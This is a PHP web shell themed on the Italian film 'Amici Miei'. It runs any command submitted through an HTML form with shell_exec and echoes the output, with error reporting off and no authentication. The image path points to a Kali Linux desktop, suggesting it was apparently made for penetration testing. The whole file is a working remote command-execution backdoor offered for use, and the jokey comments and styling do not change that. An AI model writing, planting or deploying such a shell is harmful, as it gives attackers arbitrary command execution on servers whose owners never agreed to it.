<?php
    // Disabilita la visualizzazione degli errori
    error_reporting(0);

    // Funzione per eseguire comandi shell
    function esegui_comando($cmd) {
        if (!empty($cmd)) {
            // Messaggio scherzoso
            echo "<pre>🤌 Supercazzola con scappellamento a destra: " . htmlspecialchars($cmd) . "</pre>";
            echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
        } else {
            echo "<pre>🤷‍♂️ Che fai, non scrivi nulla? Prova con una supercazzola!</pre>";
        }
    }

    // Se viene inviato un comando via POST
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        esegui_comando($command);
    }
?>

<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amici Miei Supercazzola Shell</title>
    <style>
        body {
            background-color: #2e2e2e;
            color: #fff;
            font-family: "Courier New", monospace;
            text-align: center;
        }
        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #444;
            border-radius: 10px;
            box-shadow: 0px 0px 20px #ff6347;
        }
        input[type="text"] {
            width: 80%;
            padding: 15px;
            margin: 20px 0;
            background-color: #333;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 18px;
        }
        button {
            padding: 15px 30px;
            background-color: #ff6347;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
        }
        button:hover {
            background-color: #ff4500;
        }
        pre {
            background-color: #1e1e1e;
            padding: 10px;
            border-radius: 5px;
            color: #00ff00;
            font-size: 16px;
            text-align: left;
            overflow-x: auto;
        }
        img {
            width: 300px;
            border-radius: 10px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Aggiungi l'immagine in header -->
        <img src="/home/kali/Desktop/amici-miei-456828.jpg" alt="Amici Miei Supercazzola Shell">

        <h1>Amici Miei Supercazzola Shell 🕴️</h1>
        <p>Inserisci un comando shell, con o senza scappellamento... 🕶️</p>

        <!-- Form per inserire il comando -->
        <form method="post">
            <input type="text" name="command" placeholder="Digita un comando..." autofocus>
            <button type="submit">Esegui il comando!</button>
        </form>

        <!-- Output del comando -->
        <div>
            <?php
                if (isset($_POST['command'])) {
                    echo "<h3>Risultato:</h3>";
                    esegui_comando($_POST['command']);
                }
            ?>
        </div>
    </div>
</body>
</html>

